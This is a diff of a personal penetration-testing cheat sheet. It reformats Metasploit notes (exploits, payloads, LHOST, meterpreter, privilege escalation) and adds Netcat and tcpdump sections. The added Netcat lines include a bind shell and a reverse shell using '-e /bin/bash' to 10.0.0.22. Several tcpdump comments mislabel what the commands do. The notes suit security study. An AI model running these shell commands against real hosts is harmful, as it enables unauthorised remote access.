@@ -46,12 +46,15 @@ nmap
 Metaslpoit
 
     MSFconsole
-        $ msfconsole # Entry point for the framework
-        > help
+        Entry point for the framework
+        *$ msfconsole
+        > help*
 
-        > show exploits # against known vulnerabilities
+        against known vulnerabilities
+        *> show exploits*
 
-        > show auxiliary # modules available (DoS tools, port scanning, fuzzers..)
+        modules available (DoS tools, port scanning, fuzzers..)
+        *> show auxiliary*
 
         > show payloads
 
@@ -66,17 +69,45 @@ Metaslpoit
 
         set LHOST collaborator.net
 
-        > meterpeter  # is the shell you get when you find RCE in a host.
+        is the shell you get when you find RCE in a host.
+        *> meterpeter*
         > screenshot
-        > sysinfo # operating system version etc
-        > use priv # tries to elevate privileges
-        >
+        operating system version etc
+        *> sysinfo*
+        tries to elevate privileges
+        *> use priv*
 
     MSFcli
-        $ mscli # non interactive client.
+        non interactive client.
+        *$ mscli*
+
+Netcat
+    Listens for incoming connections
+        *$ nc -nlvp 4444*
+    Connects to a remote server
+        *$ nc -nv 10.0.0.22 4444*
+    Serves incorming.exe through 4444
+        *$ nc -nlvp 4444 > incoming.exe*
+    Binds shell
+        *$ nc -nlvp 4444 -e cmd.exe*
+    Opens a reverse shell (you connect to a machine that can bash into yours)
+        *$ nc -nv 10.0.0.22 4444 -e /bin/bash*
+
 
 Wireshark
+    libpcap and wincap libraries.
+    network -> capture filters -> capture engine -> display filters
+    follow TCP stream
     tcp.port == 21
+
+
+Tcpdump
+    *$ tcpdump -r file.pcap # saves output to file.pcap*
+    *$ tcpdump -n src host 10.10.10.10 # saves packages from 10.10.10.10*
+    *$ tcpdump -n dst host 10.10.10.10 # saves packages to 10.10.10.10*
+    *$ tcpdump -n port 81 # saves packages where port 81 was involved*
+    *$ tcpdump port not 22 # skips your ssh session traffic*
+    *$ tcpdump -vv port 80 or port 443 # http and https traffic*
 
 nc
     shell
@@ -114,22 +145,6 @@ gdb
 filter your ssh traffic
     $ tcpdump -lt -i eth0 not \( host my.src.address and tcp port 22 \)
 
-
-Information gathering
-
-    Passive
-        $ whois domain # finds the domain names for a host.
-        $ nslookup domain # find the IP and authoritative servers.
-        $host -t ns google.com # Finds missconfigure DNS entries.
-
-        The Harvester: finds subdomains/email addresses
-            $ python theHarvester.py  -l 500 -b all -d canon.co.uk
-        $dig @dns-host dns-host axfr # check if transfer zone enabled
-    Active
-        nmap
-
-
-
 Cisco password:
     enable secret 5 $1$mERr$Q4J3cxRImm68KXqMDsLDs/
         $1 #hash type (1 md5), (5 sha256)
@@ -140,7 +155,7 @@ Others
     Replace contents of files
         *$ find . -name watchdog.sh -exec sed -r -e 's/(^.*)-t 10 -i/-t 9 -i/g' {} \; # replace file contents*
 
-    Ssh using private key
+    SSH using private key
         *$ ssh -i key host*
 
     Generate Ip range
